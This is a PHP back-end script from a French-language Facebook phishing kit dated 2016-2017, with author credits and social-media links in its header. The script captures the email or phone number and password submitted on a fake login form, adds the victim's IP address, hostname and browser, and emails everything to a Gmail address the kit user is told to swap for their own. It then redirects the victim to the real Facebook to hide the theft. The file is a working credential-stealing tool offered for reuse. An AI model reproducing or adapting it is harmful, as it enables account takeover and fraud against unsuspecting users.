<?
/*                           Made And Morocco hhhhhhhhh                        */
  /*****************************************************************************\
  |                Assalamu Aleikom akhi : Scama facebook French                |
  |                                                                             |   
  |                          Version : 2016-2017                                |
  |                                                                             |
  |         Change This email By Your Email : ehebham@gmail.com        |
  |                                                                             |  
  |       My Channel : https://Youtube.com/channel/UCT_hqoANFtcbOA4o4xZ0iaw     |  
  |                                                                             |  
  |         My Page  : https://www.facebook.com/Nour.blog1                      |
  |                                                                             |
  |       My Website : https://Nourblog1.Blogspot.Com                           |
  |                                                                             |
  \*****************************************************************************/
 
    $ip = getenv("REMOTE_ADDR");
	$message .= "-------------- facebook login  -------------\n";
	$message .= "Email Or Phone : ".$_POST['email']."\n";
	$message .= "Password : ".$_POST['pass']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- By Nourblog1.Blogspot.com ---------\n";
	$subject = "facebook Account | $ip";
	$send = "ehebham@gmail.com"; //Put You Email Here
	$headers = 'From: F4ceb00k' . "\r\n";
	mail($send,$subject,$message,$headers);
    header("Location: https://fr-fr.facebook.com/");?>
